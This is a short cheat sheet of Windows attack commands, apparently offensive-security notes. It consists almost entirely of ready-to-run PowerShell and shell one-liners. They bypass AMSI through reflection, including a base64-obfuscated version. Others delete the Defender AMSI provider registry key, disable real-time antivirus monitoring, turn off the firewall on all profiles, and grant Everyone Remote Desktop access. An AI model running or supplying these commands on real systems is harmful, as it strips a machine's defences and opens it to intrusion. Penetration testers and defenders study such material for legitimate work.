#  Bypass Windows AMSI / AV Evasion
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

Set-MpPreference -DisableRealtimeMonitoring $true
```

# Disable real-time protection on Windows.
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Turn Firewall off on Windows:
```bash
netsh advfirewall set allprofiles state off
```
# Remote Desktop Connection:
```bash
net localgroup "Remote Desktop Users" Everyone /Add
```

